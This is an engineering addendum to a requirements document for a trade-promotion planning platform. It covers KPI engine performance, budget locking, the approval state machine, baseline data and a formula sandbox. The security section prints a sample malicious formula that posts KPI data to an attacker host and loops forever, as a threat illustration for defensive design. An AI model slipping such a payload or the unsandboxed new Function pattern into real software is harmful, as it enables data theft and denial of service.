# COLLMIND TPM PLATFORM
## BRD ADDENDUM - TECHNICAL CLARIFICATIONS (MANDATORY)

---

**Document Type:** Technical Addendum (Engineering Prerequisites)  
**Status:** 🔴 MANDATORY - Must be addressed before implementation  
**Date:** January 7, 2026  
**Version:** 1.0 Final  
**Prepared By:** Product & Engineering Leadership  
**Reviewed By:** Senior Engineering Lead (Opus)

---

## EXECUTIVE SUMMARY

This addendum addresses **5 HIGH-PRIORITY technical gaps** identified during the BRD architectural review. These items are **not nice-to-haves**—they are **implementation blockers** that must be resolved before development begins.

**Impact if Ignored:**
- ❌ Phase 2 may fail performance targets (KPI calculation >2s = unusable)
- ❌ Production data corruption (budget overcommitment)
- ❌ Security breach (malicious formula injection)
- ❌ Phase 2 delayed indefinitely (baseline data unavailable)
- ❌ Approval workflow bugs discovered in UAT (scope creep)

**Timeline:**
- **Phase 1 Week 1-3:** Address H1, H2, H3, H5
- **Phase 1 Week 1-6:** Address H4 (parallel workstream)

---

## 📋 MANDATORY ITEMS (5 HIGH PRIORITY)

---

## H1: KPI CALCULATION ENGINE PERFORMANCE VALIDATION

### Problem Statement

**BRD Commitment:** KPI calculation for Planning-First Mode must complete in <500ms for 50 SKUs with 40 KPIs.

**Architectural Risk:**
```
40 KPIs with complex interdependencies
+ Runtime formula parsing (new Function())
+ Dependency graph resolution (topological sort)
+ SKU-level iteration (50 SKUs × 40 KPIs = 2,000 calculations)
+ FU/Plan-level aggregation (weighted averages)
+ Client-server round-trip
= May exceed 500ms significantly
```

**Why Critical:**
- Planning-First Mode's value proposition is real-time ROI optimization
- If planners wait >2s for every input change, they'll abandon the system
- No prototype exists to validate feasibility

---

### Mandatory Actions (Sprint 0 / Phase 1 Week 2-3)

#### ✅ Action 1.1: Build KPI Engine Prototype

**Deliverable:** Standalone proof-of-concept that calculates 40 KPIs for 100 SKUs in <500ms

**Scope:**
```typescript
// Prototype requirements
const prototypeSpec = {
  kpis: 40,                    // Full KPI library
  skus: 100,                   // 2× production target
  tactics: 8,                  // All tactic variations
  target: 500,                 // milliseconds
  environment: "production-like", // Not developer laptop
  includeNetworkLatency: true  // Client → Server → Client
};
```

**Success Criteria:**
- P50 (median): <300ms
- P95 (95th percentile): <500ms
- P99 (99th percentile): <800ms
- No browser freeze (UI remains responsive)

**Timeline:** Week 2-3 of Phase 1

---

#### ✅ Action 1.2: Define Fallback Architecture

**If prototype fails (<500ms not achievable), define Plan B:**

**Option A: Materialized Views (Pre-Computed KPIs)**
```sql
-- Pre-compute KPIs at save, not on every keystroke
CREATE MATERIALIZED VIEW plan_kpi_cache AS
SELECT 
  plan_id,
  sku_id,
  kpi_code,
  kpi_value,
  calculated_at
FROM kpi_calculations
WHERE calculation_level = 'sku';

-- Refresh trigger: On plan save, not on input change
```

**Pros:** Guaranteed fast (read from cache)  
**Cons:** Real-time feedback lost (calculate on save, not on input)

---

**Option B: WebAssembly Formula Engine**
```
// Compile formulas to WebAssembly (10-100× faster than eval())
const wasmEngine = await loadKPIEngine();
const results = wasmEngine.calculate(planData);
```

**Pros:** Near-native performance  
**Cons:** Complex build pipeline, limited JavaScript formula support

---

**Option C: Reduced KPI Count in UI**
```
// Show only 10-12 "essential" KPIs in real-time
// Calculate all 40 KPIs on save/submit (background job)
const essentialKPIs = [
  'PLANNED_VOL', 'INCR_VOL', 'VOL_UPLIFT_PCT',
  'PLANNED_GSV', 'INCR_GSV',
  'TOTAL_PLANNED_SPEND', 'INCR_SPEND',
  'PLANNED_GP', 'INCR_GP',
  'GP_ROI_PCT', 'RAG_STATUS'
]; // 11 KPIs only
```

**Pros:** Achievable performance  
**Cons:** Power users want more KPIs

---

#### ✅ Action 1.3: Define Phase 2 Gate Criteria

**Phase 2 cannot begin unless:**
```
✅ KPI engine prototype achieves <500ms (or fallback selected)
✅ Load test completed: 10 concurrent users editing plans
✅ Performance regression tests in CI/CD
```

**Failure Scenario:**
- If prototype fails AND fallbacks rejected → Phase 2 scope reduced (manual ROI calculation)

---

### Implementation Specification

#### Recommended Approach: Formula Compilation + Caching

```typescript
// Formula Parser with Caching
class KPIEngine {
  private formulaCache: Map<string, CompiledFormula> = new Map();
  
  async calculatePlan(plan: Plan): Promise<KPIResults> {
    // Step 1: Parse formulas once (on KPI config load)
    const kpis = await this.getKPIDefinitions();
    const compiledFormulas = kpis.map(kpi => 
      this.compileFormula(kpi) // Cache compiled functions
    );
    
    // Step 2: Resolve dependency graph (topological sort)
    const executionOrder = this.resolveDependencies(compiledFormulas);
    
    // Step 3: Calculate SKU-level (parallel where possible)
    const skuResults = await Promise.all(
      plan.skus.map(sku => this.calculateSKU(sku, executionOrder))
    );
    
    // Step 4: Aggregate to FU/Plan level
    const fuResults = this.aggregateToFU(skuResults, plan.fus);
    const planResults = this.aggregateToPlan(fuResults);
    
    return { skuResults, fuResults, planResults };
  }
  
  private compileFormula(kpi: KPI): CompiledFormula {
    // Check cache first
    if (this.formulaCache.has(kpi.kpi_code)) {
      return this.formulaCache.get(kpi.kpi_code)!;
    }
    
    // Compile formula (avoid eval() in hot path)
    const compiled = new Function('kpis', `return ${kpi.formula_text}`);
    this.formulaCache.set(kpi.kpi_code, compiled);
    return compiled;
  }
}
```

**Performance Optimization Checklist:**
- ✅ Formula compilation cached (not parsed on every calculation)
- ✅ Dependency graph resolved once (not per SKU)
- ✅ Parallel SKU calculation (Promise.all)
- ✅ Client-side calculation (no server round-trip per keystroke)
- ✅ Debounced recalculation (300ms after last input)
- ✅ Virtual scrolling (only calculate visible rows)

---

## H2: BUDGET RESERVATION/COMMITMENT RACE CONDITION

### Problem Statement

**Scenario:**
```
Budget Envelope: NKA / Hair Care / Jan 2026
Available: 10,000 TL

Timeline:
10:00:00.000 - Planner A submits agreement (8,000 TL)
10:00:00.100 - Planner B submits agreement (7,000 TL)

Both check: "Available >= Request" → TRUE
Both transactions commit → 15,000 TL reserved (overcommitment!)
```

**Why Critical:**
- Budget integrity is non-negotiable for Finance
- Overcommitment discovered during month-end reconciliation (too late)
- Manual corrections required (user trust erosion)

---

### Mandatory Actions (Phase 1 Week 1)

#### ✅ Action 2.1: Implement Pessimistic Locking

**Database-Level Transaction Isolation:**

```sql
-- Approval transaction with FOR UPDATE lock
BEGIN TRANSACTION ISOLATION LEVEL SERIALIZABLE;

-- Step 1: Lock the budget envelope
SELECT 
  allocated_amount,
  (allocated_amount - 
   (SELECT COALESCE(SUM(amount), 0) 
    FROM ledger 
    WHERE envelope_id = $1 
    AND transaction_type IN ('RESERVE', 'COMMIT', 'CONSUME'))
  ) AS available_amount
FROM budget_envelopes
WHERE id = $1
FOR UPDATE; -- 🔒 Pessimistic lock

-- Step 2: Validate availability
IF available_amount < $request_amount THEN
  ROLLBACK;
  RAISE EXCEPTION 'Insufficient budget';
END IF;

-- Step 3: Reserve budget (create ledger entry)
INSERT INTO ledger (envelope_id, entity_id, transaction_type, amount)
VALUES ($1, $2, 'RESERVE', $3);

COMMIT;
```

**Behavior:**
- Planner A's transaction acquires lock → reserves 8,000 TL → releases lock
- Planner B's transaction waits for lock → sees 2,000 TL available → REJECTED
- **Result:** Budget integrity preserved

---

#### ✅ Action 2.2: Define Retry Logic

**Client-Side Retry Strategy:**

```typescript
// Budget reservation with retry
async function reserveBudget(
  envelopeId: string, 
  amount: number,
  maxRetries: number = 3
): Promise<ReservationResult> {
  for (let attempt = 1; attempt <= maxRetries; attempt++) {
    try {
      const result = await db.transaction(async (tx) => {
        // Pessimistic lock + reserve
        return await tx.reserveBudgetWithLock(envelopeId, amount);
      });
      
      return { success: true, result };
      
    } catch (error) {
      if (error.code === 'INSUFFICIENT_BUDGET') {
        // No retry for insufficient budget (user error)
        return { 
          success: false, 
          error: 'Budget unavailable. Please check utilization.' 
        };
      }
      
      if (error.code === 'LOCK_TIMEOUT' && attempt < maxRetries) {
        // Retry on lock contention
        await sleep(1000 * attempt); // Exponential backoff
        continue;
      }
      
      throw error; // Unknown error, fail fast
    }
  }
  
  return { 
    success: false, 
    error: 'Budget reservation failed after retries. Please try again.' 
  };
}
```

**User Experience:**
- Lock timeout (rare) → 1-3 second delay → retry → success
- Insufficient budget → immediate rejection (no retry)

---

#### ✅ Action 2.3: Add Concurrent User Test

**Phase 1 Acceptance Criteria:**

```
Test: Concurrent Budget Reservation
Given: Budget envelope with 10,000 TL available
When: 10 users simultaneously submit agreements (1,500 TL each)
Then: 
  ✅ Exactly 6 agreements approved (9,000 TL reserved)
  ✅ 4 agreements rejected (insufficient budget)
  ✅ No overcommitment (Available = 1,000 TL)
  ✅ All ledger transactions consistent
```

**Test Implementation:**
```bash
# Load test script
npm run test:concurrency -- \
  --users=10 \
  --budget=10000 \
  --request=1500 \
  --envelope=test-envelope-001
  
# Expected output:
# Approved: 6 (1500 × 6 = 9000)
# Rejected: 4 (insufficient budget)
# Final Available: 1000 TL
# ✅ PASS
```

---

## H3: APPROVAL WORKFLOW STATE MACHINE SPECIFICATION

### Problem Statement

**Current BRD:**
```
States: DRAFT, PENDING, APPROVED, REJECTED, CANCELLED
```

**Unanswered Questions:**
- Can REJECTED return to PENDING? (on edit and resubmit)
- What happens to budget reservation when CANCELLED?
- Who can trigger which transitions?
- Timeout behavior for stale approvals?

**Why Critical:**
- Edge cases discovered during UAT (too late)
- Inconsistent behavior across channels (NKA vs Traditional Trade)
- Budget state leaks (reserved but never consumed)

---

### Mandatory Actions (Phase 1 Week 2)

#### ✅ Action 3.1: Define State Transition Diagram

**Agreement/Plan State Machine:**

```
┌─────────────────────────────────────────────────────────────┐
│ AGREEMENT/PLAN STATE MACHINE                               │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│     [DRAFT]                                                 │
│        │                                                    │
│        │ submit() by Planner                                │
│        ↓                                                    │
│     [PENDING]                                               │
│        │ ├─────────────────┬───────────────┐              │
│        │ │                 │               │              │
│        │ approve_L1()      │ reject()      │ cancel()     │
│        │ by Approver       │ by Approver   │ by Planner   │
│        ↓                   ↓               ↓              │
│   [PENDING_L2]         [REJECTED]       [CANCELLED]        │
│        │                   │                               │
│        │ approve_L2()      │ edit()                        │
│        │ by Finance        │ by Planner                    │
│        ↓                   ↓                               │
│   [APPROVED] ◄─────────[DRAFT]                             │
│        │                                                    │
│        │ (terminal state - no transitions out)             │
│        ↓                                                    │
│   [execution phase]                                         │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

**Valid Transitions:**

| From | To | Trigger | Condition | Budget Action |
|------|----|---------|-----------|--------------
| DRAFT | PENDING | submit() | Budget available | Check only (no reservation) |
| PENDING | APPROVED | approve_L1() | Single-level approval | RESERVE budget |
| PENDING | PENDING_L2 | approve_L1() | Multi-level approval | None (wait for L2) |
| PENDING_L2 | APPROVED | approve_L2() | All levels complete | RESERVE budget |
| PENDING | REJECTED | reject() | Any approver rejects | None |
| PENDING | CANCELLED | cancel() | Requester cancels | None |
| REJECTED | DRAFT | edit() | Requester edits | None |
| CANCELLED | DRAFT | edit() | Requester edits | None |

**Invalid Transitions:**
- ❌ APPROVED → Any state (terminal state)
- ❌ REJECTED → PENDING (must go through DRAFT)
- ❌ PENDING → DRAFT (must cancel first)

---

#### ✅ Action 3.2: Define Budget Side Effects

**Budget State Changes per Transition:**

```typescript
// State transition with budget side effects
enum StateTransition {
  SUBMIT = 'DRAFT → PENDING',
  APPROVE = 'PENDING → APPROVED',
  REJECT = 'PENDING → REJECTED',
  CANCEL = 'PENDING → CANCELLED',
  EDIT_AFTER_REJECT = 'REJECTED → DRAFT'
}

const budgetSideEffects: Record<StateTransition, BudgetAction> = {
  SUBMIT: {
    action: 'CHECK_ONLY',
    description: 'Validate budget availability but do not reserve',
    ledgerEntry: null
  },
  
  APPROVE: {
    action: 'RESERVE',
    description: 'Create RESERVE ledger transaction',
    ledgerEntry: {
      transaction_type: 'RESERVE',
      amount: agreement.cap_total_amount,
      envelope_id: agreement.envelope_id,
      entity_id: agreement.id
    }
  },
  
  REJECT: {
    action: 'NONE',
    description: 'No budget action (never reserved)',
    ledgerEntry: null
  },
  
  CANCEL: {
    action: 'RELEASE_IF_APPROVED',
    description: 'If already approved, create RELEASE transaction',
    ledgerEntry: {
      transaction_type: 'RELEASE',
      amount: -(agreement.cap_total_amount), // Negative = return funds
      envelope_id: agreement.envelope_id,
      entity_id: agreement.id
    }
  },
  
  EDIT_AFTER_REJECT: {
    action: 'NONE',
    description: 'Returns to draft, no budget implications',
    ledgerEntry: null
  }
};
```

---

#### ✅ Action 3.3: Define Timeout/Expiration Rules

**Stale Approval Prevention:**

```
Rule: Approvals pending >7 days auto-expire

Implementation:
┌─────────────────────────────────────────────────────────────┐
│ Nightly Job: Expire Stale Approvals                       │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│ SELECT id FROM agreements                                   │
│ WHERE status = 'PENDING'                                    │
│   AND submitted_at < NOW() - INTERVAL '7 days';            │
│                                                             │
│ FOR EACH stale_agreement:                                   │
│   UPDATE agreements SET                                     │
│     status = 'EXPIRED',                                     │
│     expired_at = NOW(),                                     │
│     expiry_reason = 'No action for 7 days'                  │
│   WHERE id = stale_agreement.id;                            │
│                                                             │
│   NOTIFY requester: "Agreement expired, please resubmit"    │
│   NOTIFY approver: "Approval request expired"               │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

**Grace Period:** Requester has 14 days to resubmit expired agreements before deletion.

---

## H4: BASELINE DATA EXTRACTION PLAN

### Problem Statement

**BRD Dependency:**
```
Planning-First Mode requires:
- Historical sales volumes (12 months)
- Customer × SKU × Week granularity
- ≥95% SKU coverage
```

**Current Status:**
```
Mitigation: "Start extraction in Phase 1"
Owner: Undefined
Timeline: Undefined
Minimum Viable Baseline: Undefined
```

**Why Critical:**
- Without baseline data, Phase 2 cannot launch
- "Perfect" baseline pursuit can delay indefinitely
- No degraded-mode planning exists

---

### Mandatory Actions (Phase 1 Week 1-6)

#### ✅ Action 4.1: Assign Baseline Data Owner

**Owner:** Data Engineering Team (or BI Team if no Data Eng)

**Accountability:**
```
Responsible: Extract, format, validate baseline data
Consulted: Sales Ops (customer mapping), Finance (COGS data)
Informed: Product Owner, Engineering Lead
```

**Escalation:** If owner cannot commit → Phase 2 scope reduced

---

#### ✅ Action 4.2: Define Minimum Viable Baseline (MVB)

**Baseline Requirements (Progressive Levels):**

| Level | Coverage | Time Period | Granularity | Phase 2 Capability |
|-------|----------|-------------|-------------|-------------------|
| **MVB-1** | 50% SKUs | 6 months | Customer × SKU × Month | Limited planning (top SKUs only) |
| **MVB-2** | 80% SKUs | 6 months | Customer × SKU × Week | Standard planning (most products) |
| **MVB-3** | 95% SKUs | 12 months | Customer × SKU × Week | Full planning (all products) |

**Phase 2 Gate Decision:**
- MVB-1 achieved → Phase 2 launches with limited scope
- MVB-2 achieved → Phase 2 launches as designed
- MVB-3 achieved → Full capability

**Acceptance Criteria (MVB-2):**
```sql
-- Baseline quality check
SELECT 
  COUNT(DISTINCT sku) AS covered_skus,
  COUNT(DISTINCT sku) * 100.0 / (SELECT COUNT(*) FROM products WHERE status = 'ACTIVE') AS coverage_pct,
  MIN(period_start) AS earliest_period,
  MAX(period_end) AS latest_period
FROM baseline_data;

-- Expected result for MVB-2:
-- covered_skus: ~4000 (80% of 5000 active SKUs)
-- coverage_pct: 80.0
-- earliest_period: 2025-07-01 (6 months ago)
-- latest_period: 2025-12-31
```

---

#### ✅ Action 4.3: Baseline Extraction Timeline

**Parallel Workstream (Phase 1 Week 1-6):**

| Week | Milestone | Deliverable | Owner |
|------|-----------|-------------|-------|
| **Week 1** | Kickoff | Data source identification (ERP, DW) | Data Eng |
| **Week 2** | Extraction | Sample dataset (1 month, 100 SKUs) | Data Eng |
| **Week 3** | Validation | Schema validation, quality check | Product + Data Eng |
| **Week 4** | Full Extract | 6 months × all active SKUs | Data Eng |
| **Week 5** | Import | Load into CollMind staging | Data Eng |
| **Week 6** | **MVB-2 Gate** | 80% coverage verified, Phase 2 GO/NO-GO | Product Owner |

**Risk Mitigation:**
- If Week 6 gate fails → Extend to Week 8 (2-week buffer)
- If Week 8 fails → Launch with MVB-1 (50% coverage, limited scope)

---

#### ✅ Action 4.4: Define Degraded-Mode Planning

**Fallback Strategy (if MVB-2 not achieved):**

```typescript
// Planning-First with incomplete baseline
interface DegradedPlanningMode {
  // Scenario 1: SKU has baseline
  withBaseline: {
    behavior: 'NORMAL',
    uplift: 'Calculated (Planned - Base)',
    roiAccuracy: 'HIGH'
  },
  
  // Scenario 2: SKU has no baseline
  withoutBaseline: {
    behavior: 'FORECAST_ONLY',
    baselineVolume: 0, // No historical data
    incrementalVolume: plannedVolume, // All volume is incremental
    uplift: null, // Cannot calculate uplift %
    roiAccuracy: 'LOW', // User warned: "No baseline, ROI is estimate"
    uiWarning: '⚠️ No baseline data for this SKU. ROI calculation is approximate.'
  }
};
```

**User Experience:**
```
Planning Grid (Degraded Mode):
┌─────────────────────────────────────────────────────────────┐
│ SKU: Wella SP Balance 500ml                               │
│ ⚠️ WARNING: No baseline data. ROI calculation is estimate.│
│                                                             │
│ Base Volume:     [N/A - no historical data]                │
│ Planned Volume:  [3,500] ← User input                      │
│ Incremental:     3,500 (100% of planned)                   │
│ GP ROI:          [18.2%] ⚠️ ESTIMATE ONLY                  │
└─────────────────────────────────────────────────────────────┘
```

**Finance Approval Requirement:**
- Plans with >30% SKUs without baseline → Requires explicit Finance override
- Warning: "This plan includes estimates. Actual ROI may vary significantly."

---

## H5: FORMULA ENGINE SECURITY CONTROLS

### Problem Statement

**KPI Formula Engine Design:**
```javascript
// KPI definition in database
{
  kpi_code: 'GP_ROI_PCT',
  formula_type: 'javascript',
  formula_text: '(INCR_GP / TOTAL_PLANNED_SPEND) * 100'
}

// Runtime execution
const formula = new Function('kpis', kpi.formula_text);
const result = formula(kpiValues);
```

**Security Risks:**
```javascript
// Malicious formula (admin account compromised)
formula_text: `
  (function() {
    // Exfiltrate data
    fetch('https://attacker.com', {
      method: 'POST',
      body: JSON.stringify(kpiValues)
    });
    
    // Infinite loop (DoS)
    while(true) {}
    
    // Return fake value
    return 99.9;
  })()
`
```

**Why Critical:**
- Admin accounts are high-value targets
- Server-side formula execution = arbitrary code execution
- No validation, timeout, or sandboxing specified

---

### Mandatory Actions (Phase 1 Week 3-4)

#### ✅ Action 5.1: Implement Formula Sandbox

**Approach: Restricted JavaScript Subset**

```typescript
// Safe formula evaluation (no eval, no Function constructor)
import { parse } from 'acorn'; // AST parser
import { simple as walk } from 'acorn-walk';

class SafeFormulaEngine {
  private allowedFunctions = new Set([
    'Math.abs', 'Math.round', 'Math.floor', 'Math.ceil',
    'Math.min', 'Math.max', 'Math.sqrt', 'Math.pow'
  ]);
  
  private allowedOperators = new Set([
    '+', '-', '*', '/', '%', '**', // Arithmetic
    '>', '<', '>=', '<=', '==', '!=', // Comparison
    '&&', '||', '!', // Logical
    '?', ':' // Ternary
  ]);
  
  validateFormula(formulaText: string): ValidationResult {
    try {
      // Parse to AST
      const ast = parse(formulaText, { ecmaVersion: 2020 });
      
      // Walk AST and validate
      walk(ast, {
        CallExpression: (node) => {
          // Only allow whitelisted functions
          const funcName = this.getFunctionName(node);
          if (!this.allowedFunctions.has(funcName)) {
            throw new Error(`Forbidden function: ${funcName}`);
          }
        },
        
        MemberExpression: (node) => {
          // Only allow KPI references (e.g., kpis.INCR_GP)
          const objName = node.object.name;
          if (objName !== 'kpis') {
            throw new Error(`Forbidden object access: ${objName}`);
          }
        },
        
        FunctionExpression: () => {
          throw new Error('Function definitions not allowed');
        },
        
        ArrowFunctionExpression: () => {
          throw new Error('Arrow functions not allowed');
        },
        
        ForStatement: () => {
          throw new Error('Loops not allowed');
        },
        
        WhileStatement: () => {
          throw new Error('Loops not allowed');
        }
      });
      
      return { valid: true };
      
    } catch (error) {
      return { 
        valid: false, 
        error: `Formula validation failed: ${error.message}` 
      };
    }
  }
  
  // Execute formula in isolated context
  executeFormula(formulaText: string, kpis: KPIValues): number {
    // Validate first
    const validation = this.validateFormula(formulaText);
    if (!validation.valid) {
      throw new Error(validation.error);
    }
    
    // Create restricted context (no global access)
    const context = {
      kpis,
      Math: {
        abs: Math.abs,
        round: Math.round,
        floor: Math.floor,
        ceil: Math.ceil,
        min: Math.min,
        max: Math.max,
        sqrt: Math.sqrt,
        pow: Math.pow
      }
    };
    
    // Execute with timeout
    return this.executeWithTimeout(formulaText, context, 1000); // 1s timeout
  }
  
  private executeWithTimeout(
    code: string, 
    context: any, 
    timeoutMs: number
  ): number {
    // Use vm module (Node.js) or WebWorker (browser) for isolation
    // Implementation depends on execution environment
    
    // Pseudocode:
    const result = runInIsolatedContext(code, context, timeoutMs);
    return result;
  }
}
```

---

#### ✅ Action 5.2: Add Formula Validation on Save

**Admin UI Validation Workflow:**

```typescript
// KPI Configuration Screen
async function saveKPIFormula(kpi: KPI): Promise<SaveResult> {
  // Step 1: Syntax validation
  const syntaxCheck = formulaEngine.validateFormula(kpi.formula_text);
  if (!syntaxCheck.valid) {
    return {
      success: false,
      error: `Syntax error: ${syntaxCheck.error}`
    };
  }
  
  // Step 2: Test execution with sample data
  const sampleKPIs = {
    INCR_GP: 50000,
    TOTAL_PLANNED_SPEND: 200000,
    BASE_VOL: 1000,
    PLANNED_VOL: 1200
  };
  
  try {
    const testResult = formulaEngine.executeFormula(
      kpi.formula_text, 
      sampleKPIs
    );
    
    if (!isFinite(testResult)) {
      return {
        success: false,
        error: 'Formula produces non-finite result (Infinity or NaN)'
      };
    }
    
  } catch (error) {
    return {
      success: false,
      error: `Execution error: ${error.message}`
    };
  }
  
  // Step 3: Save with audit log
  await db.transaction(async (tx) => {
    await tx.kpis.upsert(kpi);
    
    await tx.audit_logs.create({
      event_type: 'KPI_FORMULA_CHANGED',
      entity_type: 'KPI',
      entity_id: kpi.id,
      user_id: currentUser.id,
      changes: {
        old_formula: existingKPI?.formula_text,
        new_formula: kpi.formula_text
      },
      metadata: {
        test_result: testResult,
        sample_kpis: sampleKPIs
      }
    });
  });
  
  return { success: true };
}
```

---

#### ✅ Action 5.3: Implement Audit Logging for Formula Changes

**Every KPI formula change logged:**

```sql
-- Audit log entry for formula change
INSERT INTO audit_logs (
  event_type,
  entity_type,
  entity_id,
  user_id,
  user_email,
  timestamp,
  changes,
  metadata
) VALUES (
  'KPI_FORMULA_CHANGED',
  'KPI',
  'GP_ROI_PCT',
  'admin-user-123',
  'admin@company.com',
  NOW(),
  jsonb_build_object(
    'old_formula', '(INCR_GP / TOTAL_PLANNED_SPEND) * 100',
    'new_formula', '(INCR_GP / INCR_SPEND) * 100'
  ),
  jsonb_build_object(
    'ip_address', '192.168.1.100',
    'user_agent', 'Mozilla/5.0...',
    'test_result', 25.6
  )
);
```

**Audit Report (Monthly):**
```
KPI Formula Changes - December 2025
┌──────────────┬────────────┬─────────────────────────────────┐
│ KPI Code     │ Changed By │ Date                            │
├──────────────┼────────────┼─────────────────────────────────┤
│ GP_ROI_PCT   │ admin@co   │ 2025-12-15 (IP: 192.168.1.100) │
│ INCR_VOL     │ admin@co   │ 2025-12-22 (IP: 192.168.1.100) │
└──────────────┴────────────┴─────────────────────────────────┘

Report reviewed by: Finance Director
```

---

#### ✅ Action 5.4: Client-Side Execution (Not Server-Side)

**Security Principle: Execute formulas in browser, not server**

**Rationale:**
```
Server-Side Execution:
❌ Arbitrary code execution risk
❌ Server compromise = data breach
❌ DoS attack vector (infinite loops)

Client-Side Execution:
✅ Sandboxed in browser (no server access)
✅ DoS affects only user's tab (not server)
✅ No data exfiltration risk (CORS policy)
```

**Implementation:**

```typescript
// Client-side KPI calculation
class ClientSideKPIEngine {
  async calculatePlan(planId: string): Promise<KPIResults> {
    // Step 1: Fetch KPI definitions from server
    const kpiDefinitions = await api.getKPIDefinitions();
    
    // Step 2: Fetch plan data from server
    const planData = await api.getPlan(planId);
    
    // Step 3: Calculate KPIs in browser
    const results = this.calculateKPIs(kpiDefinitions, planData);
    
    // Step 4: Send results to server (for save)
    await api.savePlanKPIs(planId, results);
    
    return results;
  }
  
  private calculateKPIs(
    kpiDefs: KPI[], 
    planData: PlanData
  ): KPIResults {
    // All formula execution happens in browser
    // No server-side eval() or new Function()
    
    const safeEngine = new SafeFormulaEngine();
    return safeEngine.calculateAll(kpiDefs, planData);
  }
}
```

**Trade-off:**
- ✅ Security: No server-side code execution
- ⚠️ Performance: Client must have sufficient CPU (not a blocker for modern browsers)
- ⚠️ Offline: Requires active connection (acceptable for SaaS)

---

## 📋 SPRINT 0 CHECKLIST

**Before Phase 1 Week 1 begins, confirm:**

```
Sprint 0 Prerequisites (All must be ✅):

Technical Specifications:
  ✅ H1: KPI engine prototype plan documented
  ✅ H2: Budget concurrency SQL script written
  ✅ H3: Approval state machine diagram created
  ✅ H4: Baseline data owner assigned with timeline
  ✅ H5: Formula sandbox architecture designed

Infrastructure:
  ✅ Database provisioned (PostgreSQL 14+)
  ✅ Development environment setup
  ✅ CI/CD pipeline configured
  ✅ Monitoring/logging tools installed

Team Alignment:
  ✅ Engineering team reviewed this addendum
  ✅ Product Owner signed off on Phase 2 gate criteria
  ✅ Data Engineering committed to baseline timeline
  ✅ Security team reviewed formula sandbox approach

Documentation:
  ✅ This addendum added to Engineering Pack
  ✅ Cursor rules updated with addendum reference
  ✅ Confluence page created with sprint 0 decisions
```

---

## 🎯 PHASE 2 GATE CRITERIA (Revised)

**Phase 2 cannot begin unless:**

```
Phase 2 Gate Checklist:

H1 - KPI Engine Performance:
  ✅ Prototype achieves <500ms for 100 SKUs
  ✅ Load test passed (10 concurrent users)
  ✅ Performance regression tests in CI/CD
  ✅ Fallback architecture documented (if needed)

H2 - Budget Integrity:
  ✅ Concurrent user test passed (10 users, no overcommitment)
  ✅ Transaction isolation verified in production-like environment
  ✅ Retry logic tested (lock timeout scenarios)

H3 - Approval Workflow:
  ✅ State machine implemented with all transitions
  ✅ Budget side effects tested (RESERVE, RELEASE)
  ✅ Expiration job tested (7-day timeout)

H4 - Baseline Data:
  ✅ MVB-2 achieved (80% SKU coverage, 6 months)
  ✅ Baseline import successful (no validation errors)
  ✅ Degraded-mode planning tested (SKUs without baseline)

H5 - Formula Security:
  ✅ Formula sandbox implemented
  ✅ Validation on save tested (syntax + execution)
  ✅ Audit logging verified (all formula changes logged)
  ✅ Security review completed (penetration test if possible)

Phase 1 Completion:
  ✅ 50+ agreements created in production
  ✅ 99% uptime achieved
  ✅ All Phase 1 acceptance criteria met
```

**Decision:** Product Owner + Engineering Lead sign-off required

---

## 🚨 ESCALATION POLICY

**If any HIGH PRIORITY item cannot be resolved:**

| Item | Escalation Path | Alternative |
|------|----------------|-------------|
| **H1 (Performance)** | CTO + Product VP | Reduce Phase 2 scope (manual ROI calc) |
| **H2 (Concurrency)** | CTO + CFO | Single-user approval mode (workaround) |
| **H3 (State Machine)** | Product Owner | Simplify workflow (remove multi-level approval) |
| **H4 (Baseline)** | CFO + Data Leader | Launch with MVB-1 (50% coverage) |
| **H5 (Security)** | CISO + CTO | Disable custom formulas (hardcoded KPIs only) |

**Final Escalation:** CEO decision if project viability at risk

---

## 📝 DOCUMENT SIGN-OFF

**This addendum is mandatory. Implementation cannot begin without sign-off.**

```
Approved By:

_________________________    Date: _________
Product Owner

_________________________    Date: _________
Engineering Lead

_________________________    Date: _________
CTO / VP Engineering

_________________________    Date: _________
CFO (for budget integrity requirements)

_________________________    Date: _________
CISO (for security requirements)
```

---

## 📚 REFERENCES

- **Main BRD:** CollMind_TPM_Platform_BRD_v1.0_Final.pdf (155 pages)
- **Architectural Review:** CollMind_BRD_Review_md.pdf (Opus senior engineering assessment)
- **Section 3:** Core Components (Budget Ledger, State Management)
- **Section 5:** Planning-First Mode (KPI Calculation Engine)
- **Section 10:** Phased Delivery & Roadmap
- **Section 11:** Assumptions, Dependencies & Risks

---

**END OF ADDENDUM**

**Status:** 🔴 MANDATORY - Must be addressed before implementation  
**Next Action:** Add to Engineering Pack, Sprint 0 Checklist, Cursor Rules  
**Review Cadence:** Weekly during Phase 1 (track resolution of H1-H5)

---
